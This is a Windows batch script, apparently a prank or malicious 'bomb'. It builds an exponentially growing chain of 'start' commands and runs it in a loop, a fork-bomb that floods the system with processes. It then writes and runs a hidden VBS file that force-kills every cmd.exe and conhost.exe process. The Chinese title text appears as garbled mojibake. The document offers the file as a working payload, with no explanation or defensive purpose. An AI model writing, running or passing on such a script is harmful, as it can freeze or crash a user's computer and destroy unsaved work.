:BAT start
@title �{�����J���K�K Now Loading�K & echo off & setlocal enableextensions & setlocal enabledelayedexpansion
>nul chcp 950
goto start

:start
title �u�Ķ�R���K�K Now Loading�K
set a=start 
for /l %%a in (0,1,64) do (
set a=!a!!a!
>nul ping /n 1 /w 1000 127.0.0.1
)
title �ּu�z�����K�K Now Running�K
for /l %%a in (0,1,64) do (
!a!
)
title �ּu�M�����K�K Now Ending�K
set script="%temp%\�ּu�M��%random%.vbs"
>%script% echo Set UAC = CreateObject^("Shell.Application"^)
for /l %%a in (0,1,64) do (
>>%script% echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename eq cmd.exe""", "", "", 0
>>%script% echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename eq conhost.exe""", "", "", 0
)
call %script%
del /f /q %script%
exit